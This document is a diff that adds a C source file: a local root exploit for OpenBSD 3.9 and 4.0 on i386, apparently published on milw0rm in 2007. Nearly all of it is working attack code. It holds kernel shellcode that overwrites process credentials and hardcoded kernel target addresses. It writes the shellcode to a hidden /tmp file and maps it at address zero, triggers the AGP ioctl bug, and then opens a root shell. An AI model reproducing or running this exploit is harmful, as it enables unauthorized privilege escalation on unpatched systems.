@@ -1,0 +1,133 @@
+/* 
+
+Critical Security OpenBSD 3.x-4.0 vga_ioctl() root exploit 
+
+Bug had been discovered by allmighty Ilja van Sprundel (ilja.netric.org) 
+Some code had been stolen from noir's openbsd exploit sources 
+
+Fix is available: 
+ftp://ftp.openbsd.org/pub/OpenBSD/patches/4.0/i386/007_agp.patch 
+
+Critical Security [http://www.critical.lt], Lithuania, Vilnius, 2007 
+
+Linkejimai neegzistuojancio fronto kariams ;] 
+*/ 
+
+#include <sys/param.h> 
+#include <sys/ioctl.h> 
+#include <sys/syscall.h> 
+#include <sys/agpio.h> 
+#include <unistd.h> 
+#include <err.h> 
+#include <fcntl.h> 
+#include <stdlib.h> 
+#include <sys/types.h> 
+#include <sys/stat.h> 
+#include <sys/mman.h> 
+#include <sys/sysctl.h> 
+
+#define TARGET1 "\x51\x47\x48\xd0"  /* 0xd0484751 obsd 4.0 generic i386*/ 
+#define TARGET2 "\xa9\x42\x10\xd0"  /* 0xd01042a9 obsd 3.9 generic i386*/ 
+
+char shellcode[]= 
+"\x18\x00\x00\x00" 
+"\x18\x00\x00\x00" 
+"\x18\x00\x00\x00" /* some crap */ 
+"\x18\x00\x00\x00" 
+"\x18\x00\x00\x00" 
+
+"\x18\x00\x00\x00" /* jmp 0x00000018 */ 
+
+"\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad" 
+"\xde\xad\xde\xef\xbe\x90\x90\x90\x5f\x8b\x0f\x8b" /* p_cred & u_cred shellcode */ 
+"\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89\x42\x04" 
+
+"\xb8\x51\x47\x48\xd0" 
+"\xff\xe0"; 
+
+void usage() 
+{ 
+printf("Usage: crit_obsd_ex target\n\n"); 
+printf("valid targets:\n"); 
+printf("(1)\tobsd 4.0 generic i386\n"); 
+printf("(2)\tobsd 3.9 generic i386\n\n"); 
+exit(0); 
+} 
+
+void get_proc(pid_t pid, struct kinfo_proc *kp) 
+{ 
+   u_int arr[4], len; 
+
+        arr[0] = CTL_KERN; 
+        arr[1] = KERN_PROC; 
+        arr[2] = KERN_PROC_PID; 
+        arr[3] = pid; 
+        len = sizeof(struct kinfo_proc); 
+        if(sysctl(arr, 4, kp, &len, NULL, 0) < 0) { 
+                perror("sysctl"); 
+                printf("this is an unexpected error, rerun!\n"); 
+                exit(-1); 
+        } 
+} 
+
+int main(int ac, char *av[]) 
+{ 
+        int i; 
+        void *p; 
+        int fd,failas; 
+        u_long  pprocadr; 
+        struct kinfo_proc kp; 
+
+printf("\n+--------------------------------------------+\n"); 
+printf("|     Critical Security local obsd root      |\n"); 
+printf("+--------------------------------------------+\n\n"); 
+
+if (ac<2) usage(); 
+if(atoi(av[1])==1) 
+{ 
+for(i=0;i<4;i++)shellcode[61+i]=TARGET1[i]; 
+} 
+else if(atoi(av[1])==2) 
+{ 
+for(i=0;i<4;i++)shellcode[61+i]=TARGET2[i]; 
+} 
+else {usage();} 
+
+        get_proc((pid_t) getpid(), &kp); 
+        pprocadr = (u_long) kp.kp_eproc.e_paddr; 
+
+        shellcode[24+5] = pprocadr & 0xff; 
+        shellcode[24+6] = (pprocadr >> 8) & 0xff; 
+        shellcode[24+7] = (pprocadr >> 16) & 0xff; 
+        shellcode[24+8] = (pprocadr >> 24) & 0xff; 
+
+        printf("[~] shellcode size: %d\n",sizeof(shellcode)); 
+
+        fd=open("/tmp/. ", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR); 
+        if(fd < 0) 
+                err(1, "open"); 
+
+        write(fd, shellcode, sizeof(shellcode)); 
+        if((lseek(fd, 0L, SEEK_SET)) < 0) 
+                err(1, "lseek"); 
+
+        p=mmap(0, sizeof(shellcode), PROT_READ|PROT_EXEC, MAP_FIXED, fd, 0); 
+        if (p == MAP_FAILED) 
+        err(1, "mmap"); 
+
+        printf("[~] map addr: 0x%x\n",p); 
+        printf("[~] exploiting...\n"); 
+        failas = open(AGP_DEVICE, O_RDWR); 
+        syscall(SYS_ioctl, failas, 0x80044103, NULL); 
+
+        close(failas); 
+        close(fd); 
+
+        seteuid(0); 
+        setuid(0); 
+        printf("[~] uid: %d euid: %d gid: %d \n", getuid(), geteuid(),getgid()); 
+        execl("/bin/sh", "cyber", NULL); 
+
+}
+
+// milw0rm.com [2007-01-07]
